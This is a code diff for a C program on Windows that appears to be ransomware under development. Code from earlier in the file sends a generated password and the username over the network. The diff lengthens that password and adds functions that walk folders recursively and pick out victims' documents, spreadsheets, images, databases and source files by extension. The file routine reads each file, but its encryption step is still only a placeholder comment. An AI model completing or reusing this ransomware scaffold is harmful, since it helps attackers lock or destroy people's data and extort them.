@@ -14,11 +14,15 @@ _________ .__                  .__    .__               _________         __
 #include <Windows.h>
 #include <Lmcons.h>
 #include <winsock2.h>
+#include <dirent.h>
 #pragma comment(lib,"ws2_32.lib") // Code::Blocks->Settings->Compiler->Linker->Other linker options: => "-lws2_32";
 
 char *createPassword(int lengthPass);
 void createMessage(char userName);
 int sendPassword(char *userName, char *passwd);
+int fileEncrypt(char path[]);
+int folderEncrypt(char basePath[]);
+
 
 int main(){
 
@@ -29,11 +33,16 @@ int main(){
 
     srand(time(NULL));
 
-    char *passwd = createPassword(10);
+    char *passwd = createPassword(256);
     printf("%s", passwd);
 
-//    createMessage(userName);
+//  createMessage(userName);
     sendPassword(userName, passwd);
+
+    // This is for the encryption
+    char basePath[] = "C:/Users/Zelra/Desktop/MyFile"; // Path for the base folder
+    //fileEncrypt(fileptr);
+    folderEncrypt(basePath);
 
     free(passwd);
     return 0;
@@ -174,8 +183,75 @@ int sendPassword(char *userName, char *passwd){
 
 }
 
+int fileEncrypt(char path[]){
+    char *buffer;
+    long filelen;
+    FILE *fileptr;
 
-//
-//Encrypt file
-//Encrypt Folder
-//Algorithme cryptage ( AEncrypte, Clef)
+    fileptr = fopen(path, "rb");  // Open the file in binary mode
+
+    if (fileptr == NULL){
+        printf("Pointer Error");
+        return 1;
+    }
+    fseek(fileptr, 0, SEEK_END);          // Jump to the end of the file
+    filelen = ftell(fileptr);             // Get the current byte offset in the file
+    rewind(fileptr);                      // Jump back to the beginning of the file
+
+    buffer = (char *)malloc((filelen+1)*sizeof(char)); // Enough memory for file + \0
+    if (buffer == NULL){
+        printf("Buffer Error");
+        return 1;
+    }
+    fread(buffer, filelen, 1, fileptr); // Read in the entire file
+    for(int i = 0; i < filelen; i++){
+        printf("%c", buffer[i]);
+        //Encrypt Here
+    }
+    printf("%s", buffer);
+    fclose(fileptr); // Close the file
+    return 0;
+}
+
+int folderEncrypt(char basePath[]){
+    const char* arrayExtensions[] = { ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd" };
+
+    char path[1000];
+    strcpy(path, basePath);
+
+    struct dirent *dp;
+    DIR *dir = opendir(basePath);
+
+    if (!dir)
+    {
+        return;
+    }
+
+    while ((dp = readdir(dir)) != NULL)
+    {
+        if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0)
+        {
+            // ---- DEBUG ----
+            printf("%s\n", path);
+            //printf("%s\n", dp->d_name);
+
+            // Construct new path from our base path
+            strcpy(path, basePath);
+            strcat(path, "/");
+            strcat(path, dp->d_name);
+
+            // Find the extension in the file name
+            for (int i=0; i < 20; i++){ //20 Is the length of the ArrayExtensions
+                char *extension = arrayExtensions[i];
+                if(strstr(dp->d_name, extension) != NULL) {
+                    // Encrypt the file
+                    fileEncrypt(path);
+                }
+            }
+           folderEncrypt(path);
+        }
+    }
+    closedir(dir);
+    return 0;
+}
+
